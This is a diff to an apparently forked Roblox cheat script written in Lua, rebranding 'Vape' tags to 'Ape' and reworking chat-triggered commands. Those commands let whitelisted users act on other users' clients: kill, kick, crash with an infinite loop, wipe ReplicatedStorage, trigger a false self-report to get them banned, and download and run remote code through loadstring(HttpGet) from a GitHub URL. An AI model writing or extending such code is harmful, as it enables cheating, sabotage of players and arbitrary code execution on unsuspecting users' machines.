@@ -10459,19 +10459,12 @@ function CanAttackUser(u)
 end
 
 local commands = {
-	[".bye"] = function()
+	[";kill default"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
 		end
 	end,
-	[".show"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			local textChatService = game:GetService("TextChatService")
-			wait(0.0001)
-			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Vape")
-		end
-	end,
-	[".void"] = function()
+	[";void default"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local character = game.Players.LocalPlayer.Character
 			local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
@@ -10483,7 +10476,7 @@ local commands = {
 			end
 		end
 	end,
-	[".kick"] = function()
+	[";kick default"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			wait(1)
 			for index, player in pairs(game.Players:GetPlayers()) do
@@ -10491,39 +10484,44 @@ local commands = {
 			end
 		end
 	end,
-	[".rick"] = function()
+	[";ban default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			local rs = game:GetService("ReplicatedStorage")
+			local remote = rs:FindFirstChild("SelfReport", true)
+			remote:FireServer("injection_detected")
+		end
+	end,
+	[";rickroll default"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
 		end
 	end,
-	[".freeze"] = function()
+	[";freeze default"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
 		end
 	end,
-	[".thaw"] = function()
+	[";thaw default"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
 		end
 	end,
-	[".why"] = function()
+	[";breakgame default"] = function()
+		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
+			pcall(function()
+				local replicatedStorage = game:GetService("ReplicatedStorage")
+				for _, child in ipairs(replicatedStorage:GetDescendants()) do
+					child:Destroy()
+				end
+			end)
+		end
+	end,
+	[";crash default"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			while true do end
 		end
-	end,
-	[".lagback"] = function()
-		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
-			for i = 1, 10 do
-				wait()
-				local player = game.Players.LocalPlayer
-				local character = player.Character or player.CharacterAdded:Wait()
-				local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
-				local forwardVector = humanoidRootPart.CFrame.LookVector
-				local newPosition = humanoidRootPart.CFrame.p + forwardVector * 1000000
-				humanoidRootPart.CFrame = CFrame.new(newPosition, newPosition + forwardVector)
-			end
-		end
-	end,
+	end
+ end
 }
 
 function isPlayerAllowed()
@@ -10567,7 +10565,7 @@ txt.OnIncomingMessage = function(msg)
 		local otherPriority, plrattackable, plrtag = WhitelistFunctions:GetWhitelist(plr2)
 		if CanAttackUser(plr2) and plr2 ~= lplr then
 			if message.Text:find("ALAAZA") then
-				warningNotification("Vape",plr2.Name.." Is Using Vape",60)
+				warningNotification("Vape",plr2.Name.." Is Using Ape",60)
 				table.insert(users,plr2.UserId)
 			end
 		end
@@ -10594,22 +10592,22 @@ txt.OnIncomingMessage = function(msg)
 		local colors = {
 			["red"] = "#ff0000",
 			["orange"] = "#ff7800",
-			["yellow"] = "#33ccff",
+			["yellow"] = "#e5ff00",
 			["green"] = "#00ff00",
 			["blue"] = "#0000ff",
-			["purple"] = "#33ccff",
+			["purple"] = "#b800b8",
 			["pink"] = "#ff00ff",
 			["black"] = "#000000",
 			["white"] = "#ffffff",
 		}
 		if CanAttackUser(plr2) and plr2 ~= lplr then
 			if message.Text:find("ALAAZA") then
-				warningNotification("Vape",plr2.Name.." Is Using Vape",60)
+				warningNotification("Vape",plr2.Name.." Is Using Ape",60)
 				table.insert(users,plr2.UserId)
 				table.insert(whitelist["tags"],{
 					userid = plr2.UserId,
 					color = "yellow",
-					tag = "VAPE USER"
+					tag = "APE USER"
 				})
 			end
 		end
@@ -10640,7 +10638,7 @@ txt.OnIncomingMessage = function(msg)
 		local userType = 0
 		local hasTag = false
 		if users[plr2.UserId] ~= nil then
-			p.PrefixText = "<font color='"..colors["yellow"].."'>[VAPE USER]</font> " .. msg.PrefixText
+			p.PrefixText = "<font color='"..colors["yellow"].."'>[APE USER]</font> " .. msg.PrefixText
 			hasTag = true
 			return p
 		end
@@ -10660,7 +10658,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='"..colors["yellow"].."'>[nrn (loves cats)]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='"..colors["yellow"].."'>[]</font> " .. msg.PrefixText
 					end
 					userType = 1
 				end
@@ -10672,7 +10670,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='#33ccff'>[Ape Developer]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='#ff0000'>[MOON OWNER (ANTI SKID)]</font> " .. msg.PrefixText
 					end
 					userType = 3
 				end
